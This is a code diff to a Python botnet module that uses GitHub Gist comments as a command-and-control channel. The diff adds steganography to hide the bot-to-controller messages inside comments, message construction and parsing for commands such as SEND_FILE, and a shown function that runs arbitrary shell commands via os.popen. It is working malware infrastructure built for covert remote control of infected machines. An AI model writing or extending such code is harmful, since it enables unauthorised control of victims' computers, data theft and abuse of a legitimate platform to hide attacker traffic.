@@ -3,11 +3,11 @@ import re
 import json
 from enum import Enum
 import base64
+import stegano
 
 INITIALIZED = False
-CONTROLLER_IP = ""
-GIT_API_TOKEN = ""
-GIST_ID = ""
+GIT_API_TOKEN = ''
+GIST_ID = ''
 
 REFRESH_DELAY = 20 # seconds
 BROADCAST = 0
@@ -19,17 +19,6 @@ class Command(Enum):
     SEND_FILE = 2
 
 
-# TODO rework
-# TODO check if parsable
-def parse_msg(comment):
-    isctrl, bot, cmd, d, r = comment.split(DELIM)[1:6]
-    isctrl = bool(int(isctrl))
-    bot = int(bot)
-    cmd = Command[cmd]
-    r = bool(int(r))
-    return isctrl, bot, cmd, d, r
-
-
 def init_config():
     file = open('config.json', 'r')
     config = json.load(file)
@@ -38,10 +27,40 @@ def init_config():
     global GIT_API_TOKEN, GIST_ID, CONTROLLER_IP
     GIT_API_TOKEN = config['GIT_API_TOKEN']
     GIST_ID = config['GIST_ID']
-    CONTROLLER_IP = config['CONTROLLER_IP']
+
+    stegano.init_config(config)
 
     global INITIALIZED
     INITIALIZED = True
+
+
+def send_message(message):
+    comment = stegano.ensteg(message)
+    return post_gist_comment(comment)
+
+
+def get_fresh_messages(last_seen):
+    fresh_comments, last_seen = get_fresh_comments(last_seen)
+    messages = [stegano.desteg(comment['body']) for comment in fresh_comments]
+    return messages, last_seen
+
+
+def construct_message(isctrl, bot, cmd, data, respond):
+    return DELIM \
+        + str(int(isctrl)) + DELIM \
+        + str(bot) + DELIM \
+        + cmd.name + DELIM \
+        + data + DELIM \
+        + str(int(respond)) + DELIM
+
+
+def parse_message(comment):
+    isctrl, bot, cmd, d, r = comment.split(DELIM)[1:6]
+    isctrl = bool(int(isctrl))
+    bot = int(bot)
+    cmd = Command[cmd]
+    r = bool(int(r))
+    return isctrl, bot, cmd, d, r
 
 
 def post_gist_comment(msg):
@@ -147,11 +166,3 @@ def perform_command(cmd):
     stream = os.popen(cmd)
     out = stream.read()
     return out
-
-
-def text_to_base64(s):
-    return base64.b64encode(s.encode('utf-8')).decode('utf-8')
-
-
-def base64_to_text(b):
-    return base64.b64decode(b.encode('utf-8')).decode('utf-8')
